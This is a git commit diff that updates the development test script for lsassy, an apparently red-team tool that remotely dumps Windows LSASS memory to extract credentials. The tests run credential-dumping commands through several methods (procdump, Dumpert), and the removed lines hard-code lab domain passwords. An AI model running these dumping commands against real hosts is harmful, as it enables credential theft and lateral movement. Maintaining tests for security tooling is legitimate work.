6e7ac005c39e0efc26f8a64884fcf006d39a4879
pixis <hackndo@gmail.com>
2020-01-18 17:30:58 +0100

    Better tests

--- test/tests_dev.sh
+++ test/tests_dev.sh
@@ -1,7 +1,9 @@
 #!/bin/bash
 
+source ./tests.config.sh
+
 echo -n "[TEST] Connexion error : "
-RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.254.254.254' 2>&1)
+RESULT=$(lsassy -j "${DOMAIN_ADMIN}@192.254.254.254" 2>&1)
 RET=$(echo "$RESULT" | grep -c 'Connexion error')
 if [ "$RET" -gt 0 ]
 then
@@ -12,7 +14,7 @@ else
 fi
 
 echo -n "[TEST] Authentication error : "
-RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_comin_!@192.168.1.123' 2>&1)
+RESULT=$(lsassy -j "test/test:t3st@${IP_OK}" 2>&1)
 RET=$(echo "$RESULT" | grep -c 'Authentication error')
 if [ "$RET" -gt 0 ]
 then
@@ -23,7 +25,7 @@ else
 fi
 
 echo -n "[TEST] Access denied : "
-RESULT=$(lsassy -j 'adsec.local/jlannister:summer4ever!@192.168.1.123' 2>&1)
+RESULT=$(lsassy -j "${USER}@${IP_OK}" 2>&1)
 RET=$(echo "$RESULT" | grep -c 'Access denied')
 if [ "$RET" -gt 0 ]
 then
@@ -34,7 +36,7 @@ else
 fi
 
 echo -n "[TEST] Error opening share : "
-RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' --dumppath "E\$/Windows/Temp" 2>&1)
+RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" --dumppath "E\$/Windows/Temp" 2>&1)
 RET=$(echo "$RESULT" | grep -c 'Error opening share')
 if [ "$RET" -gt 0 ]
 then
@@ -45,7 +47,7 @@ else
 fi
 
 echo -n "[TEST] Error opening file : "
-RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' --dumppath "C\$/Windws/Temp" 2>&1)
+RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" --dumppath "C\$/Windws/Temp" 2>&1)
 RET=$(echo "$RESULT" | grep -c 'Error opening file')
 if [ "$RET" -gt 0 ]
 then
@@ -57,7 +59,7 @@ fi
 
 
 echo -n "[TEST] Method not supported : "
-RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' -m 99 --timeout 1 2>&1)
+RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 99 --timeout 1 2>&1)
 RET=$(echo "$RESULT" | grep -c 'Method not supported')
 if [ "$RET" -gt 0 ]
 then
@@ -67,31 +69,26 @@ else
   echo -e "--- Log ---\n$RESULT\n-----------"
 fi
 
-echo -n "[TEST] No result, might be too slow : "
-RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.121' -m 3 2>&1)
-RET=$(echo "$RESULT" | grep -c 'Target might be slow')
-if [ "$RET" -gt 0 ]
-then
-  echo -e "\e[32mSuccess\e[39m"
-else
-  echo -e "\e[31mFailure\e[39m"
-  echo -e "--- Log ---\n$RESULT\n-----------"
-fi
 
 echo -n "[TEST] lsass is protected : "
-RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.121' -m 2 --timeout 1 -p /home/pixis/Tools/Windows/Sysinternals/procdump.exe  2>&1)
-RET=$(echo "$RESULT" | grep -c 'protected')
-if [ "$RET" -gt 0 ]
+if [ "$IP_PROTECTED" != "" ] && [ "$PROCDUMP" != "" ]
 then
-  echo -e "\e[32mSuccess\e[39m"
+  RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_PROTECTED}" -m 2 --timeout 1 -p /home/pixis/Tools/Windows/Sysinternals/procdump.exe  2>&1)
+  RET=$(echo "$RESULT" | grep -c 'protected')
+  if [ "$RET" -gt 0 ]
+  then
+    echo -e "\e[32mSuccess\e[39m"
+  else
+    echo -e "\e[31mFailure\e[39m"
+    echo -e "--- Log ---\n$RESULT\n-----------"
+  fi
 else
-  echo -e "\e[31mFailure\e[39m"
-  echo -e "--- Log ---\n$RESULT\n-----------"
+  echo -e "\e[33mSkipped\e[39m"
 fi
 
 echo -n "[TEST] json : "
-RESULT=$(lsassy 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' --raw -j  2>&1)
-RET=$(echo "$RESULT" | grep -c '"ADMIN01\$"')
+RESULT=$(lsassy "${DOMAIN_ADMIN}@${IP_OK}" --raw -j  2>&1)
+RET=$(echo "$RESULT" | grep -c '"LKAPP01\$"')
 if [ "$RET" -gt 0 ]
 then
   echo -e "\e[32mSuccess\e[39m"
@@ -101,8 +98,8 @@ else
 fi
 
 echo -n "[TEST] raw : "
-RESULT=$(lsassy 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' --raw  2>&1)
-RET=$(echo "$RESULT" | grep -c 'ADSEC\\ADMIN01\$')
+RESULT=$(lsassy "${DOMAIN_ADMIN}@${IP_OK}" --raw  2>&1)
+RET=$(echo "$RESULT" | grep -c '\\LKAPP01\$')
 if [ "$RET" -gt 0 ]
 then
   echo -e "\e[32mSuccess\e[39m"
@@ -112,7 +109,7 @@ else
 fi
 
 echo -n "[TEST] Method 0 : "
-RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' -m 0 --timeout 1 -p /home/pixis/Tools/Windows/Sysinternals/procdump.exe  2>&1)
+RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 0 --timeout 1 -p /home/pixis/Tools/Windows/Sysinternals/procdump.exe  2>&1)
 RET=$(echo "$RESULT" | grep -c '{')
 if [ "$RET" -gt 0 ]
 then
@@ -123,7 +120,7 @@ else
 fi
 
 echo -n "[TEST] Method 1 : "
-RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' -m 1 --timeout 1 2>&1)
+RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 1 --timeout 1 2>&1)
 RET=$(echo "$RESULT" | grep -c '{')
 if [ "$RET" -gt 0 ]
 then
@@ -133,19 +130,25 @@ else
   echo -e "--- Log ---\n$RESULT\n-----------"
 fi
 
+
 echo -n "[TEST] Method 2 : "
-RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' -m 2 --timeout 1 -p /home/pixis/Tools/Windows/Sysinternals/procdump.exe  2>&1)
-RET=$(echo "$RESULT" | grep -c '{')
-if [ "$RET" -gt 0 ]
+if [ "$PROCDUMP" != "" ]
 then
-  echo -e "\e[32mSuccess\e[39m"
+  RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 2 --timeout 1 -p /home/pixis/Tools/Windows/Sysinternals/procdump.exe  2>&1)
+  RET=$(echo "$RESULT" | grep -c '{')
+  if [ "$RET" -gt 0 ]
+  then
+    echo -e "\e[32mSuccess\e[39m"
+  else
+    echo -e "\e[31mFailure\e[39m"
+    echo -e "--- Log ---\n$RESULT\n-----------"
+  fi
 else
-  echo -e "\e[31mFailure\e[39m"
-  echo -e "--- Log ---\n$RESULT\n-----------"
+  echo -e "\e[33mSkipped\e[39m"
 fi
 
 echo -n "[TEST] Method 3 : "
-RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' -m 3 --timeout 1 2>&1)
+RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 3 --timeout 1 2>&1)
 RET=$(echo "$RESULT" | grep -c '{')
 if [ "$RET" -gt 0 ]
 then
@@ -156,7 +159,7 @@ else
 fi
 
 echo -n "[TEST] Method 4 : "
-RESULT=$(lsassy -j 'adsec.local/jsnow:Winter_is_coming_!@192.168.1.123' -m 4 --timeout 1 2>&1)
+RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 4 --timeout 1 2>&1)
 RET=$(echo "$RESULT" | grep -c '{')
 if [ "$RET" -gt 0 ]
 then
@@ -166,3 +169,19 @@ else
   echo -e "--- Log ---\n$RESULT\n-----------"
 fi
 
+
+echo -n "[TEST] Method 5 : "
+if [ "$DUMPERT" != "" ]
+then
+  RESULT=$(lsassy -j "${DOMAIN_ADMIN}@${IP_OK}" -m 5 --timeout 1 -u /home/pixis/Tools/Windows/Dumpert/Outflank-Dumpert.exe  2>&1)
+  RET=$(echo "$RESULT" | grep -c '{')
+  if [ "$RET" -gt 0 ]
+  then
+    echo -e "\e[32mSuccess\e[39m"
+  else
+    echo -e "\e[31mFailure\e[39m"
+    echo -e "--- Log ---\n$RESULT\n-----------"
+  fi
+else
+  echo -e "\e[33mSkipped\e[39m"
+fi
